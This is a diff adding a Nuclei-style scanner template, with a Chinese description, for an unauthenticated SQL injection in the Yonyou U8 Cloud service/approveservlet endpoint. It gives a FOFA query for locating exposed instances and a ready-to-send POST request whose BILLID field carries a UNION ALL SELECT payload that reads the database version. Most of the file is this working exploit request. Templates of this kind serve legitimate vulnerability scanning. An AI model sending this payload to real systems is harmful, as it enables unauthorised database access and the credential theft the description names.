@@ -1,0 +1,39 @@
+id: yongyouU8-Cloud-approveservlet-sql
+
+info:
+  name: "用友 U8 Cloud service 接口 SQL 注入漏洞"
+  author: Unknown
+  severity: high
+  description: |-
+    fofa: title=="U8C"
+      该漏洞源于用友U8 Cloud service/approveservlet 接口未正确过滤输入参数中的特殊字符，导致攻击者可通过构造恶意SQL语句实现注入攻击。未经身份验证的远程攻击者可利用此漏洞提取数据库敏感信息（包括但不限于管理员后台凭证、用户隐私数据），在具备高权限写入能力时，可能通过注入命令向服务器植入恶意代码，最终导致数据库信息泄露及系统控制权丧失。
+  reference:
+  - https://mp.weixin.qq.com/s?__biz=MzkzMTcwMTg1Mg==&mid=2247489182&idx=1&sn=43153077f1b12d816a475a87439b5cf7&chksm=c267a3adf5102abbc38c27f371a10ab2d03a31b02e179700d450375da86947a498564aa1365b&token=1526905597&lang=zh_CN#rd
+  tags: 用友U8
+
+
+
+http:
+- raw:
+  - |
+    POST /service/approveservlet HTTP/1.1
+    Host: {{Hostname}}
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
+    Content-Type: application/x-www-form-urlencoded
+
+    BILLID=1'%20UNION%20ALL%20SELECT%20NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,@@VERSION,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--%20WPWZ&BILLTYPE=4331&USERID=3&RESULT=4&DATASOURCE=U8cloud
+  matchers-condition: and
+  matchers:
+  - type: word
+    part: body
+    words:
+    - 'Microsoft SQL'
+    - 'Microsoft Corporation'
+    condition: and
+  - type: status
+    status:
+    - 200
+
+
+
+
